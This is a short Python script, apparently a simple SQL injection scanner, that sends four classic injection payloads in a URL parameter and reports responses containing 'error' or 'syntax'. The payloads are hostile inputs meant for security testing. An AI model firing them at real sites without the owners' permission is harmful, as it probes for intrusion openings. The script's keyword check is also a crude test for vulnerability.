import requests

def test_sql_injection(url, param):
    payloads = ["' OR '1'='1", "' OR 'a'='a", "' OR 1=1--", "' UNION SELECT NULL--"]
    vulnerable = False
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        response = requests.get(test_url)
        if "error" in response.text or "syntax" in response.text:
            print(f"Possible SQL Injection vulnerability detected with payload: {payload}")
            vulnerable = True
    if not vulnerable:
        print("No SQL Injection vulnerabilities detected.")

if __name__ == "__main__":
    url = input("Enter the URL to test (e.g., http://example.com/page): ")
    param = input("Enter the parameter name to test: ")
    test_sql_injection(url, param)
